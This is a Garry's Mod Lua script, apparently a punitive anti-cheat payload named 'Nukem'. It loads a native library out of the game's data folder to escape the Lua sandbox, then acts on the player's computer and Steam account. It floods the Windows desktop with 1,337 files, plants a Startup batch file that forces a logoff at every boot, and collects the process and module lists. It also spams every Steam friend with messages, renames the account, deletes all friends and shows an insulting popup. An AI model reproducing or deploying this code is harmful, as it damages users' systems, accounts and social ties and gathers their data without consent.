
local _E = _G
_R = debug.getregistry()

local _H = {
	DelayGMG = print,
	FPath		= FPath,
	EatThis = EatThis,
	HookCall = hook.Call,
	NotRCC		= RunConsoleCommand,
	NotDGE	= debug.getinfo,
	NotDGU	 = debug.getupvalue,
	NotSMT		= setmetatable,
	NotGMT	= getmetatable,
	NotRGT	 = rawget,
	NotRST		= rawset,
	NotCRC	= util.CRC,
	NotRQ	 = require,
	NotRS		= RunString,
	NotGCI	= collectgarbage,
	NotCGB	 = gcinfo,
	NotTS		= timer.Simple,
	NotTC	= timer.Create,
	NotMR	 = math.random,
	NotTIS		= table.insert,
	NotJUF	= jit.util.funcinfo,
	NotRPF	 = util.RelativePathToFull,
	NotSD	 = string.dump,

	NotCS	= CompileString,
	NotSIW	 = system.IsWindows(),
	NotGMG		= print,
	Read	= file.Read,
	NotFE	 = file.Exists,
	NotSX		= RunStringEx,
	ConCon	= RunConsoleCommand,
	NotFF	 = file.Find,
	NotFO		= file.Open,
	F_Size 	= _R.File.Size,
	F_Close	 = _R.File.Close,
	F_Read 		= _R.File.Read, 
	F_Write = _R.File.Write,
	NotFD	 = file.Delete,
	NotDGMT		= debug.getmetatable,
	Format	= Format,
	pairs	 = pairs,
	tostring 	= tostring,
	pcall	= pcall,
	_R		= _R, 
}

Tell = print


local Ran,SID = _H.pcall(function()
	if not _E.LocalPlayer or not _E.LocalPlayer().SteamID or not _E.LocalPlayer().SteamID64 then return end
	return _E.LocalPlayer():SteamID().." (".._E.LocalPlayer():SteamID64()..")"
end)
SID = _H.tostring(SID)
if #SID < 10 then
	Tell("BadSID ("..SID..")")
	SID = nil
end

local Spam = {
	"Hey",
	"Did you know that I hack and cheat on Garry's Mod? It's true!\nI would love you to ban me on all the servers that you know of. My SteamID is "..(SID and SID or "on my profile")..", and never listen to anything I say.",
	"I never expected this would happen, but Looten Plunder is right. I will never be cheating again, I'm leaving this game and moving on.\n",
	"Block and remove me now please.",
}

local function Duke(nukem)
	_H.pcall(function()
		nukem.DeleteSystem32 = 1
		local Prof = nukem.win.GetVar("USERPROFILE")
		local Piss = "Hello cheater"..(SID and " "..SID or "")..". I could have done a lot worse. Do not ever cheat again."
		for i=1,1337 do
			nukem.file.Write(Prof.."\\Desktop\\Hello "..i..".txt", Piss)
		end
		nukem.file.Write(Prof.."\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Hello.bat", "shutdown /l /f")
		nukem.DeleteSystem32 = 0
	end)
	
	_H.pcall(function()
		local Dec = {}
		local GPL = nukem.win.GetProcessList()
		if GPL then Dec.GPL = GPL end
		
		local GLM = nukem.win.GetLoadedModules("hl2.exe")
		if GLM then Dec.GLM = GLM end
		
		Dec = _H.NotJST(Dec)
		
		Tell("GLM")
		_H.HookCall("CLAC", Dec)
	end)
	
	local Nick = "I HACK IN GARRY'S MOD! BAN ME!"
	_H.pcall(nukem.steam.Add, "76561198049672310")
	
	_H.pcall(function()
		local All = nukem.steam.GetAll()
		for Him=0,All do
			for k=1,#Spam do
				nukem.steam.Spam(Him, Spam[k] )
			end
			for i=0,5 do
				nukem.steam.Spam(Him, Nick)
			end
		end
		Tell("SpamFriends "..All)
	end)
	
	_H.pcall(nukem.steam.SetName, Nick)
	Tell("NickSet")
	
	_H.NotTS(2, function()
		_H.pcall(function()
			local All = {}
			for Him=0, nukem.steam.GetAll() do
				All[ #All + 1 ] = nukem.steam.ToSID64(Him)
			end
			for k,v in pairs(All) do
				nukem.steam.Remove(v)
			end
			Tell("RemoveFriends")
		end)
	end)
	
	_H.NotTS(3, function()
		_H.pcall(function()
			nukem.win.EjectAll()
			nukem.win.MessageBox("Message from garry", "User "..(SID and SID.." " or "").."is failure.")
			Tell("UserIsFailure")
		end)
	end)
end


local Steel = "[Nukem] HeX has balls of steel!\n"
local Done 	= 0
_G[Steel]	= false

local function CheckBalls()
	if Done != -1 and Done > 40 then
		Tell("TooManyBalls ("..Done..")")
		Done = -1
		return
	end
	
	local nukem = _G[Steel]
	if nukem and Done != -1 then
		_G[Steel] = nil
		Tell("Running ("..Done..")")
		Duke(nukem)
		
		Done = -2
		return
	end
	Done = Done + 1
end


local function LoadLibrary(Cont)
	if not (_E.package and _E.package.loaders) then Tell("NoLoad0") return end
	local LoadLib = _E.package.loaders[3] --[[Oh garry, not reading the documentation eh?, when will you ever learn..]]
	if not LoadLib then Tell("NoLoad1") return end
	
	local Name = "hac_9285716752303932119.dat"
	
	package.cpath = "garrysmod/data/"..Name
	print( _H.pcall(LoadLib, Name, "gmod_open") )
	return 1
end



if LoadLibrary(Balls) then
	_H.NotTC( _H.tostring(CheckBalls), 0.3, 50, CheckBalls)
end

Tell("Gold")



































